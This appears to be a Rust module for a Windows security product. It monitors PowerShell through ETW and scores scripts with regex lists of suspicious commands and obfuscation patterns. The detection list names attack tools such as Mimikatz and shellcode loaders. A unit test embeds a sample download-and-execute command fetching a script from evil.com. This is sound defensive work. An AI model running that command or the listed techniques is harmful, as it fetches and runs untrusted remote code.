//! PowerShell Monitor Module
//!
//! This module provides real-time monitoring of PowerShell script block execution
//! through ETW (Event Tracing for Windows) subscription to the Microsoft-Windows-PowerShell
//! provider. It detects obfuscated scripts, suspicious commands, and potential threats.
//!
//! Key capabilities:
//! - ETW event subscription for PowerShell activities
//! - Script block execution monitoring
//! - Command obfuscation detection
//! - Suspicious PowerShell pattern analysis
//! - Real-time threat scoring for PowerShell activities

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, SystemTime};
use tokio::sync::{mpsc, RwLock};
use tracing::{debug, error, info, warn};
use windows::core::{GUID, HSTRING, PCWSTR};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Diagnostics::Etw::*;

/// PowerShell ETW Provider GUID: {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
const POWERSHELL_PROVIDER_GUID: GUID = GUID::from_u128(0xA0C1853B_5C40_4B15_8766_3CF1C58F985A);

/// PowerShell Core ETW Provider GUID: {F90714A8-5509-434A-BF6D-B1624C4C4E42}
const POWERSHELL_CORE_PROVIDER_GUID: GUID = GUID::from_u128(0xF90714A8_5509_434A_BF6D_B1624C4C4E42);

/// PowerShell event types we monitor
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PowerShellEventType {
    /// Script block execution
    ScriptBlockExecution,
    /// Command invocation
    CommandInvocation,
    /// Pipeline execution
    PipelineExecution,
    /// Module loading
    ModuleLoading,
    /// Provider lifecycle
    ProviderLifecycle,
    /// Engine lifecycle
    EngineLifecycle,
    /// Unknown or unclassified event
    Unknown(u16),
}

/// PowerShell script analysis result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptAnalysis {
    /// Whether obfuscation was detected
    pub obfuscation_detected: bool,
    /// Obfuscation techniques found
    pub obfuscation_techniques: Vec<String>,
    /// Suspicious commands detected
    pub suspicious_commands: Vec<String>,
    /// Entropy score (higher = more obfuscated)
    pub entropy_score: f64,
    /// Base64 encoded content detected
    pub base64_content: bool,
    /// Compressed content detected
    pub compressed_content: bool,
    /// Risk assessment score (0.0 - 1.0)
    pub risk_score: f64,
}

/// PowerShell monitoring event data
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PowerShellEvent {
    /// Event timestamp
    pub timestamp: SystemTime,
    /// Type of PowerShell event
    pub event_type: PowerShellEventType,
    /// Process ID that executed the script
    pub process_id: u32,
    /// PowerShell session ID
    pub session_id: Option<String>,
    /// Script block content (if available)
    pub script_content: Option<String>,
    /// Command line arguments
    pub command_line: Option<String>,
    /// Script analysis results
    pub analysis: Option<ScriptAnalysis>,
    /// Event-specific data
    pub event_data: serde_json::Value,
    /// Risk score (0.0 - 1.0)
    pub risk_score: f64,
    /// Additional context information
    pub context: Option<String>,
}

/// PowerShell monitoring configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PowerShellMonitorConfig {
    /// Enable real-time monitoring
    pub enabled: bool,
    /// Minimum risk score threshold for alerts
    pub risk_threshold: f64,
    /// Maximum events to buffer
    pub max_buffer_size: usize,
    /// Event processing interval in milliseconds
    pub processing_interval_ms: u64,
    /// Enable script content analysis
    pub analyze_script_content: bool,
    /// Maximum script size to analyze (bytes)
    pub max_script_size: usize,
    /// Enable detailed logging
    pub verbose_logging: bool,
    /// Monitor PowerShell Core in addition to Windows PowerShell
    pub monitor_powershell_core: bool,
}

impl Default for PowerShellMonitorConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            risk_threshold: 0.6,
            max_buffer_size: 1000,
            processing_interval_ms: 100,
            analyze_script_content: true,
            max_script_size: 1024 * 1024, // 1MB
            verbose_logging: false,
            monitor_powershell_core: true,
        }
    }
}

/// PowerShell Monitor implementation
pub struct PowerShellMonitor {
    config: Arc<RwLock<PowerShellMonitorConfig>>,
    event_sender: mpsc::UnboundedSender<PowerShellEvent>,
    event_receiver: Arc<RwLock<Option<mpsc::UnboundedReceiver<PowerShellEvent>>>>,
    session_handles: Arc<RwLock<Vec<CONTROLTRACE_HANDLE>>>,
    is_running: Arc<RwLock<bool>>,
    suspicious_patterns: Arc<RwLock<Vec<Regex>>>,
    obfuscation_patterns: Arc<RwLock<Vec<Regex>>>,
}

impl PowerShellMonitor {
    /// Create a new PowerShell monitor instance
    pub fn new(config: PowerShellMonitorConfig) -> Self {
        let (event_sender, event_receiver) = mpsc::unbounded_channel();

        let monitor = Self {
            config: Arc::new(RwLock::new(config)),
            event_sender,
            event_receiver: Arc::new(RwLock::new(Some(event_receiver))),
            session_handles: Arc::new(RwLock::new(Vec::new())),
            is_running: Arc::new(RwLock::new(false)),
            suspicious_patterns: Arc::new(RwLock::new(Vec::new())),
            obfuscation_patterns: Arc::new(RwLock::new(Vec::new())),
        };

        // Initialize detection patterns
        tokio::spawn({
            let monitor = monitor.clone();
            async move {
                monitor.initialize_detection_patterns().await;
            }
        });

        monitor
    }

    /// Start PowerShell monitoring
    pub async fn start(&self) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let mut is_running = self.is_running.write().await;
        if *is_running {
            return Ok(());
        }

        info!("Starting PowerShell monitor with ETW subscription");

        // Initialize ETW sessions
        self.initialize_etw_sessions().await?;

        *is_running = true;

        // Start event processing task
        self.start_event_processing().await;

        info!("PowerShell monitor started successfully");
        Ok(())
    }

    /// Stop PowerShell monitoring
    pub async fn stop(&self) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let mut is_running = self.is_running.write().await;
        if !*is_running {
            return Ok(());
        }

        info!("Stopping PowerShell monitor");

        // Stop ETW sessions
        self.cleanup_etw_sessions().await?;

        *is_running = false;

        info!("PowerShell monitor stopped successfully");
        Ok(())
    }

    /// Check if monitor is currently running
    pub async fn is_running(&self) -> bool {
        *self.is_running.read().await
    }

    /// Get current configuration
    pub async fn get_config(&self) -> PowerShellMonitorConfig {
        self.config.read().await.clone()
    }

    /// Update configuration
    pub async fn update_config(&self, new_config: PowerShellMonitorConfig) {
        let mut config = self.config.write().await;
        *config = new_config;
        info!("PowerShell monitor configuration updated");
    }

    /// Get event receiver for consuming PowerShell events
    pub async fn take_event_receiver(&self) -> Option<mpsc::UnboundedReceiver<PowerShellEvent>> {
        self.event_receiver.write().await.take()
    }

    /// Initialize detection patterns for suspicious PowerShell activities
    async fn initialize_detection_patterns(&self) {
        let mut suspicious_patterns = self.suspicious_patterns.write().await;
        let mut obfuscation_patterns = self.obfuscation_patterns.write().await;

        // Suspicious command patterns
        let suspicious_regexes = vec![
            r"(?i)invoke-expression",
            r"(?i)iex\s*\(",
            r"(?i)invoke-webrequest",
            r"(?i)downloadstring",
            r"(?i)downloadfile",
            r"(?i)bypass\s+executionpolicy",
            r"(?i)hidden\s+windowstyle",
            r"(?i)encodedcommand",
            r"(?i)reflection\.assembly",
            r"(?i)system\.net\.webclient",
            r"(?i)start-process.*hidden",
            r"(?i)add-type.*csharp",
            r"(?i)invoke-shellcode",
            r"(?i)invoke-mimikatz",
        ];

        for pattern in suspicious_regexes {
            if let Ok(regex) = Regex::new(pattern) {
                suspicious_patterns.push(regex);
            }
        }

        // Obfuscation detection patterns
        let obfuscation_regexes = vec![
            r"[A-Za-z0-9+/]{50,}={0,2}", // Base64 patterns
            r#"\$\w+\s*=\s*['"].*?['"]\s*;\s*\$\w+\s*=\s*\$\w+\.replace"#, // String replacement obfuscation
            r"\[char\]\d+",                    // Character code obfuscation
            r"\$\w+\s*=\s*\$\w+\s*\+\s*\$\w+", // String concatenation
            r"-join\s*\(",                     // Join operations
            r"\[convert\]::frombase64string",  // Base64 decoding
            r"\[system\.text\.encoding\]::",   // Encoding operations
            r"\[compression\.",                // Compression operations
        ];

        for pattern in obfuscation_regexes {
            if let Ok(regex) = Regex::new(pattern) {
                obfuscation_patterns.push(regex);
            }
        }

        debug!(
            "Initialized {} suspicious patterns and {} obfuscation patterns",
            suspicious_patterns.len(),
            obfuscation_patterns.len()
        );
    }

    /// Initialize ETW sessions for PowerShell monitoring
    async fn initialize_etw_sessions(
        &self,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let config = self.config.read().await;
        let mut session_handles = self.session_handles.write().await;

        // Start Windows PowerShell session
        let ps_handle = self
            .start_etw_session("ErdpsPowerShellMonitorSession", &POWERSHELL_PROVIDER_GUID)
            .await?;
        session_handles.push(ps_handle);

        // Start PowerShell Core session if enabled
        if config.monitor_powershell_core {
            let ps_core_handle = self
                .start_etw_session(
                    "ErdpsPowerShellCoreMonitorSession",
                    &POWERSHELL_CORE_PROVIDER_GUID,
                )
                .await?;
            session_handles.push(ps_core_handle);
        }

        debug!(
            "Initialized {} ETW sessions for PowerShell monitoring",
            session_handles.len()
        );
        Ok(())
    }

    /// Start a single ETW session
    async fn start_etw_session(
        &self,
        session_name: &str,
        provider_guid: &GUID,
    ) -> Result<CONTROLTRACE_HANDLE, Box<dyn std::error::Error + Send + Sync>> {
        let session_name = HSTRING::from(session_name);

        unsafe {
            // Create ETW session properties
            let mut session_properties = EVENT_TRACE_PROPERTIES {
                Wnode: WNODE_HEADER {
                    BufferSize: std::mem::size_of::<EVENT_TRACE_PROPERTIES>() as u32 + 512,
                    Flags: WNODE_FLAG_TRACED_GUID,
                    Guid: *provider_guid,
                    ..Default::default()
                },
                BufferSize: 128, // 128KB buffers for script content
                MinimumBuffers: 8,
                MaximumBuffers: 32,
                MaximumFileSize: 0,
                LogFileMode: EVENT_TRACE_REAL_TIME_MODE,
                FlushTimer: 1, // 1 second flush timer
                EnableFlags: EVENT_TRACE_FLAG(0),
                NumberOfBuffers: 0,
                FreeBuffers: 0,
                EventsLost: 0,
                BuffersWritten: 0,
                LogBuffersLost: 0,
                RealTimeBuffersLost: 0,
                LoggerThreadId: HANDLE(0),
                LogFileNameOffset: 0,
                LoggerNameOffset: std::mem::size_of::<EVENT_TRACE_PROPERTIES>() as u32,
                Anonymous: Default::default(),
            };

            let mut session_handle = CONTROLTRACE_HANDLE { Value: 0 };

            // Start ETW trace session
            let result = StartTraceW(
                &mut session_handle,
                PCWSTR(session_name.as_ptr()),
                &mut session_properties,
            );

            if result.is_err() {
                error!(
                    "Failed to start ETW trace session {}: {:?}",
                    session_name, result
                );
                return Err(format!("ETW session start failed with error: {:?}", result).into());
            }

            // Enable PowerShell provider with script block logging
            let enable_result = EnableTraceEx2(
                session_handle,
                provider_guid,
                EVENT_CONTROL_CODE_ENABLE_PROVIDER.0,
                TRACE_LEVEL_VERBOSE as u8,
                0x0000000000000001, // Enable script block logging
                0,                  // MatchAllKeyword
                0,                  // Timeout
                None,
            );

            if enable_result.is_err() {
                error!(
                    "Failed to enable PowerShell ETW provider: {:?}",
                    enable_result
                );
                // Clean up session
                let _ = StopTraceW(session_handle, PCWSTR::null(), &mut session_properties);
                return Err(
                    format!("ETW provider enable failed with error: {:?}", enable_result).into(),
                );
            }

            Ok(session_handle)
        }
    }

    /// Cleanup ETW sessions
    async fn cleanup_etw_sessions(&self) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let mut session_handles = self.session_handles.write().await;

        for session_handle in session_handles.drain(..) {
            unsafe {
                let mut session_properties = EVENT_TRACE_PROPERTIES {
                    Wnode: WNODE_HEADER {
                        BufferSize: std::mem::size_of::<EVENT_TRACE_PROPERTIES>() as u32 + 512,
                        ..Default::default()
                    },
                    LoggerNameOffset: std::mem::size_of::<EVENT_TRACE_PROPERTIES>() as u32,
                    ..Default::default()
                };

                let result = StopTraceW(session_handle, PCWSTR::null(), &mut session_properties);

                if result.is_err() {
                    warn!("Failed to stop ETW trace session: {:?}", result);
                }
            }
        }

        debug!("ETW sessions cleaned up");
        Ok(())
    }

    /// Start event processing task
    async fn start_event_processing(&self) {
        let config = self.config.clone();
        let sender = self.event_sender.clone();
        let is_running = self.is_running.clone();
        let suspicious_patterns = self.suspicious_patterns.clone();
        let obfuscation_patterns = self.obfuscation_patterns.clone();

        tokio::spawn(async move {
            let mut interval = tokio::time::interval(Duration::from_millis(
                config.read().await.processing_interval_ms,
            ));

            while *is_running.read().await {
                interval.tick().await;

                // Process ETW events (placeholder for actual ETW event consumption)
                Self::process_etw_events(
                    &sender,
                    &config,
                    &suspicious_patterns,
                    &obfuscation_patterns,
                )
                .await;
            }
        });
    }

    /// Process ETW events (placeholder implementation)
    async fn process_etw_events(
        _sender: &mpsc::UnboundedSender<PowerShellEvent>,
        config: &Arc<RwLock<PowerShellMonitorConfig>>,
        _suspicious_patterns: &Arc<RwLock<Vec<Regex>>>,
        _obfuscation_patterns: &Arc<RwLock<Vec<Regex>>>,
    ) {
        // This is a placeholder implementation
        // In a real implementation, this would:
        // 1. Consume events from the ETW sessions
        // 2. Parse PowerShell script block events
        // 3. Analyze script content for threats
        // 4. Calculate risk scores
        // 5. Send events through the channel

        let config_guard = config.read().await;
        if config_guard.verbose_logging {
            debug!("Processing ETW events for PowerShell monitoring");
        }
    }

    /// Analyze PowerShell script content for threats
    pub async fn analyze_script(&self, script_content: &str) -> ScriptAnalysis {
        let suspicious_patterns = self.suspicious_patterns.read().await;
        let obfuscation_patterns = self.obfuscation_patterns.read().await;

        let mut analysis = ScriptAnalysis {
            obfuscation_detected: false,
            obfuscation_techniques: Vec::new(),
            suspicious_commands: Vec::new(),
            entropy_score: Self::calculate_entropy(script_content),
            base64_content: false,
            compressed_content: false,
            risk_score: 0.0,
        };

        // Check for suspicious commands
        for pattern in suspicious_patterns.iter() {
            if let Some(matches) = pattern.find(script_content) {
                analysis
                    .suspicious_commands
                    .push(matches.as_str().to_string());
            }
        }

        // Check for obfuscation techniques
        for pattern in obfuscation_patterns.iter() {
            if pattern.is_match(script_content) {
                analysis.obfuscation_detected = true;
                // Add specific technique detection logic here
            }
        }

        // Check for Base64 content
        analysis.base64_content = script_content.contains("frombase64string")
            || script_content.contains("tobase64string");

        // Check for compression indicators
        analysis.compressed_content = script_content.contains("gzipstream")
            || script_content.contains("deflatestream")
            || script_content.contains("compression");

        // Calculate overall risk score
        analysis.risk_score = Self::calculate_script_risk_score(&analysis);

        analysis
    }

    /// Calculate entropy of script content
    fn calculate_entropy(content: &str) -> f64 {
        let mut char_counts = HashMap::new();
        let total_chars = content.len() as f64;

        if total_chars == 0.0 {
            return 0.0;
        }

        // Count character frequencies
        for ch in content.chars() {
            *char_counts.entry(ch).or_insert(0) += 1;
        }

        // Calculate Shannon entropy
        let mut entropy = 0.0;
        for &count in char_counts.values() {
            let probability = count as f64 / total_chars;
            if probability > 0.0 {
                entropy -= probability * probability.log2();
            }
        }

        entropy
    }

    /// Calculate risk score for script analysis
    fn calculate_script_risk_score(analysis: &ScriptAnalysis) -> f64 {
        let mut score = 0.0;

        // Base score from suspicious commands
        score += analysis.suspicious_commands.len() as f64 * 0.2;

        // Obfuscation penalty
        if analysis.obfuscation_detected {
            score += 0.4;
        }

        // Entropy penalty (high entropy suggests obfuscation)
        if analysis.entropy_score > 4.0 {
            score += 0.3;
        }

        // Base64 content penalty
        if analysis.base64_content {
            score += 0.2;
        }

        // Compression penalty
        if analysis.compressed_content {
            score += 0.1;
        }

        score.min(1.0)
    }
}

impl Clone for PowerShellMonitor {
    fn clone(&self) -> Self {
        Self {
            config: self.config.clone(),
            event_sender: self.event_sender.clone(),
            event_receiver: Arc::new(RwLock::new(None)), // New instance gets no receiver
            session_handles: Arc::new(RwLock::new(Vec::new())), // New instance gets no handles
            is_running: Arc::new(RwLock::new(false)),    // New instance starts stopped
            suspicious_patterns: self.suspicious_patterns.clone(),
            obfuscation_patterns: self.obfuscation_patterns.clone(),
        }
    }
}

impl Drop for PowerShellMonitor {
    fn drop(&mut self) {
        // Ensure cleanup on drop
        if let Ok(handles) = self.session_handles.try_read() {
            if !handles.is_empty() {
                warn!("PowerShellMonitor dropped without proper cleanup");
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_powershell_monitor_creation() {
        let config = PowerShellMonitorConfig::default();
        let monitor = PowerShellMonitor::new(config);

        assert!(!monitor.is_running().await);
    }

    #[tokio::test]
    async fn test_script_analysis() {
        let config = PowerShellMonitorConfig::default();
        let monitor = PowerShellMonitor::new(config);

        // Wait for pattern initialization
        tokio::time::sleep(Duration::from_millis(100)).await;

        let suspicious_script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')";
        let analysis = monitor.analyze_script(suspicious_script).await;

        assert!(analysis.risk_score > 0.0);
        assert!(!analysis.suspicious_commands.is_empty());
    }

    #[test]
    fn test_entropy_calculation() {
        let low_entropy = "aaaaaaaaaa";
        let high_entropy = "a1B2c3D4e5F6g7H8i9J0";

        let low_score = PowerShellMonitor::calculate_entropy(low_entropy);
        let high_score = PowerShellMonitor::calculate_entropy(high_entropy);

        assert!(high_score > low_score);
    }

    #[test]
    fn test_risk_score_calculation() {
        let mut analysis = ScriptAnalysis {
            obfuscation_detected: true,
            obfuscation_techniques: vec!["base64".to_string()],
            suspicious_commands: vec!["invoke-expression".to_string()],
            entropy_score: 5.0,
            base64_content: true,
            compressed_content: false,
            risk_score: 0.0,
        };

        analysis.risk_score = PowerShellMonitor::calculate_script_risk_score(&analysis);
        assert!(analysis.risk_score > 0.5);
    }

    #[tokio::test]
    async fn test_config_update() {
        let config = PowerShellMonitorConfig::default();
        let monitor = PowerShellMonitor::new(config);

        let mut new_config = PowerShellMonitorConfig::default();
        new_config.risk_threshold = 0.8;

        monitor.update_config(new_config.clone()).await;
        let updated_config = monitor.get_config().await;

        assert_eq!(updated_config.risk_threshold, 0.8);
    }
}
